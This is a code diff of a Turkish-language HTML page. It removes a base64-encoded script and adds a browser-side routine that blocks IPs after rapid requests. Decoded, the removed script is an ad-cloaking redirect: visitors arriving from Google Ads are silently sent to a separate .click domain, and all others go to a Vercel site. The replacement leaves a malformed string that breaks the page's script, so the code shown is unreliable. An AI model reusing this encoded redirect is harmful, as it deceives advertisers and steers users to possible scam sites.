@@ -468,7 +468,8 @@
 <body>
 <script>
 (function () {
-    const encoded = "PHNjcmlwdD4KKGZ1bmN0aW9uICgpIHsKCiAgICAvLyBEYWhhIMO2bmNlIHnDtm5sZW5kaXJtZSB5YXBpbGRpIG3EsT8gKDEga2V6KSAgCiAgICBpZiAoc2Vzc2lvblN0b3JhZ2UuZ2V0SXRlbSgicmVkaXJlY3RlZCIpID09PSAieWVzIikgewogICAgICAgIC8vIEJpciBkYWhhIHnDtm5sZW5kaXJtZSB5YXBtYQogICAgICAgIHJldHVybjsKICAgIH0KCiAgICBjb25zdCBwYXJhbXMgPSBuZXcgVVJMU2VhcmNoUGFyYW1zKHdpbmRvdy5sb2NhdGlvbi5zZWFyY2gpOwoKICAgIC8vIEdvb2dsZSBSZWtsYW0gdGVzcGl0aQogICAgY29uc3QgaXNHb29nbGVBZHMgPQogICAgICAgIHBhcmFtcy5oYXMoImdjbGlkIikgfHwKICAgICAgICAocGFyYW1zLmdldCgic3V0bV9zb3VyY2UiKSAmJiBwYXJhbXMuZ2V0KCJ1dG1fc291cmNlIikudG9Mb3dlckNhc2UoKSA9PT0gImdvb2dsZSIpIHx8CiAgICAgICAgKHBhcmFtcy5nZXQoInV0bV9tZWRpdW0iKSAmJiBbImNwYyIsICJwcGMiXS5pbmNsdWRlcyhwYXJhbXMuZ2V0KCJ1dG1fbWVkaXVtIikudG9Mb3dlckNhc2UoKSkpOwoKICAgIC8vIFlvw7ZubGVuZGlybWUgIHNhZGVjZSAxIGtleiBpxZ9hcmV0bGVuaXlvciAKICAgIHNlc3Npb25TdG9yYWdlLnNldEl0ZW0oInJlZGlyZWN0ZWQiLCAieWVzIik7CgogICAgaWYgKGlzR29vZ2xlQWRzKSB7CiAgICAgICAgLy8gR29vZ2xlIHJla2xhbWxhcsSxbmRhbiBnZWxkaXlzZSDihpIgdG9raWtvbnV0bGFyaWthc2ltYXlpLmNsaWNrLzkyMzQ2MTIzNjQ4MiArIHTDvG0gcGFyYW1ldHJlbGVyCiAgICAgICAgd2luZG93LmxvY2F0aW9uLmhyZWYgPSAiaHR0cHM6Ly90b2tpa29udXRsYXJpa2FzaW1heWkuY2xpY2svOTIzNDYxMjM2NDgyCgIiICsgd2luZG93LmxvY2F0aW9uLnNlYXJjaDsKICAgIH0gZWxzZSB7CiAgICAgICAgLy8gTm9ybWFsIGdpcmnEnyDihpIgVmVyY2VsIHV5Z3VsYW1hc8SxCiAgICAgICAgd2luZG93LmxvY2F0aW9uLmhyZWYgPSAiaHR0cHM6Ly9uYWtseWllLWxhYy52ZXJjZWwuYXBwLyI7CiAgICB9Cgp9KSgpOwo8L3NjcmlwdD4=
+    const encoded = "
+    =
 ";
 
     const decoded = atob(encoded);
@@ -714,6 +715,63 @@
     
     // Initialize on page load
     window.addEventListener('DOMContentLoaded', detectTrafficSource);
+    
+    // ============================================
+    // Otomatik IP Engelleme Sistemi
+    // ============================================
+    
+    function checkAndBlockSuspiciousIPs() {
+      try {
+        const logs = JSON.parse(localStorage.getItem('visitorLogs') || '[]');
+        const blocked = JSON.parse(localStorage.getItem('blockedIPs') || '{}');
+        
+        // Son 5 dakikadaki loglar
+        const fiveMinutesAgo = new Date(Date.now() - 5 * 60 * 1000).toISOString();
+        const recentLogs = logs.filter(l => l.timestamp >= fiveMinutesAgo);
+        
+        // Eşik: Son 30 saniyede 5+ istek = şüpheli
+        const suspiciousThreshold = 5;
+        const timeWindow = 30 * 1000; // 30 saniye
+        const now = Date.now();
+        
+        Object.entries(
+          recentLogs.reduce((acc, log) => {
+            if (!acc[log.clientIP]) acc[log.clientIP] = [];
+            acc[log.clientIP].push(new Date(log.timestamp).getTime());
+            return acc;
+          }, {})
+        ).forEach(([ip, timestamps]) => {
+          // Son 30 saniyedeki istekleri kontrol et
+          const recentRequests = timestamps.filter(t => now - t < timeWindow);
+          
+          if (recentRequests.length >= suspiciousThreshold) {
+            if (!blocked[ip]) {
+              blocked[ip] = {
+                blockedAt: new Date().toISOString(),
+                reason: `Çoklu hızlı istek (${recentRequests.length} istek/30sn)`,
+                requestCount: recentRequests.length,
+                lastSeen: new Date().toISOString()
+              };
+              localStorage.setItem('blockedIPs', JSON.stringify(blocked));
+              
+              console.warn(`⛔ IP ENGELLENDİ: ${ip} (${recentRequests.length} hızlı istek)`);
+              
+              // Backend'e bildir
+              fetch('/api/block-ip', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ ip, blockInfo: blocked[ip] })
+              }).catch(() => {});
+            }
+          }
+        });
+      } catch (e) {
+        console.error('⚠️ IP engelleme kontrol hatası:', e);
+      }
+    }
+    
+    // Her 10 saniyede bir kontrolü çalıştır
+    setInterval(checkAndBlockSuspiciousIPs, 10000);
   </script>
 </body>
 </html>
